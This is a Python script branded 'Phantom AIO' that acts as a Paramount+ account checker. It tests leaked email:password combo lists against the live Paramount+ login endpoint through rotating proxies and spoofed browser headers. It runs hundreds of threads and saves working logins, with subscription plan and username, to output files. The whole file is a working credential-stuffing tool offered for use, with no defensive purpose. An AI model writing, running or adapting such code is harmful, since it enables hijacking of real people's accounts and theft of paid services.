import os, sys, time, random, string, json, ctypes, concurrent.futures
import requests
import tls_client
import fake_useragent
import bs4
import colorama
import datetime
import threading

from json import dumps
from requests import Session
from random import choice
from fake_useragent import UserAgent as ua
from bs4 import BeautifulSoup as Soup
from colorama import Fore, Style
from urllib.parse import quote

red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
dark_green = Fore.GREEN + Style.BRIGHT

colorama.init()
print()

valid = 0
invalid = 0
proxy_error = 0
accounts_processed = 0
check_proxy = 0
custom = 0

start_time = time.time()
ctypes.windll.kernel32.SetConsoleTitleW(f'『 Phantom AIO 』 ~ Paramount+ Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Proxy Error : {proxy_error}')

def update_console_title():
    global valid, invalid, proxy_error, start_time, accounts_processed
    current_time = time.time()
    elapsed_time = current_time - start_time
    cpm = int((accounts_processed / elapsed_time) * 60)
    ctypes.windll.kernel32.SetConsoleTitleW(f'『 Phantom AIO 』 ~ Paramount+ Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Proxy Error : {proxy_error} | CPM : {cpm}')
    
def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

def paramount_checker(email, password):
    global valid, invalid, accounts_processed, proxy_error, check_proxy, custom
    proxy = choice(open("proxies.txt", "r").readlines()).strip() if len(
        open("proxies.txt", "r").readlines()) != 0 else None

    session = Session()

    proxy = (choice(open("./proxies.txt", "r").readlines()).strip()
             if len(open("./proxies.txt", "r").readlines()) != 0
             else None)
    if ":" in proxy and len(proxy.split(":")) == 4:
        ip, port, user, pw = proxy.split(":")
        proxy_string = f"http://{user}:{pw}@{ip}:{port}"
    else:
        ip, port = proxy.split(":")
        proxy_string = f"http://{ip}:{port}"

    session.proxies = {
        "http": proxy_string,
        "https": proxy_string
    }
    try:
        headers = {
            "Content-Type": "application/x-www-form-urlencoded" ,
            "accept": "application/json, text/plain, */*" ,
            "accept-encoding": "gzip, deflate, br" ,
            "accept-language": "fr-FR,fr;q=0.9" ,
            "origin": "https://www.paramountplus.com" ,
            "referer": "https://www.paramountplus.com/account/signin/" ,
            "sec-ch-ua": "\"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"" ,
            "sec-ch-ua-mobile": "?0" ,
            "sec-fetch-dest": "empty" ,
            "sec-fetch-mode": "cors" ,
            "sec-fetch-site": "same-origin" ,
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" ,
            "x-requested-with": "XMLHttpRequest"
        }
        r = session.get("https://www.paramountplus.com/account/signin/").text.split('"tk_trp":"')[1].split('"')[0]

        payload = f"email={email}&password={quote(password)}&tk_trp={r}"
        headers["Content-Length"] = str(len(payload.format(email, password, r)))
        response = session.post("https://www.paramountplus.com/account/xhr/login/", headers=headers, data=payload)
        if "Invalid" in response.text or "\"success\":false" in response.text:
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
            invalid += 1
            accounts_processed += 1
            update_console_title()
            return
        elif "isSubscriber" not in response.text:
            raise

        data = response.json()
        subscribed = data["user"]["isSubscriber"]
        if not subscribed:
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}~{gray}) {pretty}Custom {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
            custom += 1
            accounts_processed += 1
            update_console_title()
            folder = "Checked/Paramount"
            if not os.path.exists(folder):
                os.makedirs(folder)
            with open("Checked/Paramount/paramount_custom.txt", "a+", encoding='utf-8') as save:
                save.write(f"{email}:{password}" + "\n")
            return

        subscription = data["user"]["svod"]["user_package"]["code"].replace("_"," ").lower().title()
        plan = data["user"]["svod"]["user_package"]["plan_type"].title()
        username = data["displayName"]
        time_rn = get_time_rn()
        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Valid {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
        folder = "Checked/Paramount"
        if not os.path.exists(folder):
            os.makedirs(folder)
        with open("Checked/Paramount/paramount_good.txt", "a+", encoding='utf-8') as save2:
            save2.write(f"{email}:{password} | Subscription : {subscription} | Username : {username} | Plan : {plan}" + "\n")
        valid += 1
        accounts_processed += 1
        update_console_title()
        return
    except:
        proxy_error += 1
        update_console_title()
        paramount_checker(email, password)

accounts = []

with open('combos.txt', 'r', errors='ignore') as file:
    for line in file:
        if ':' in line:
            email, password = line.rsplit(':', 1)
            accounts.append((email.strip(), password.strip()))

def process_account(email, password):
    paramount_checker(email, password)

def start_threads():
    threads = []
    for email, password in accounts:
        thread = threading.Thread(target=process_account, args=(email, password))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

max_threads = 500

start_threads()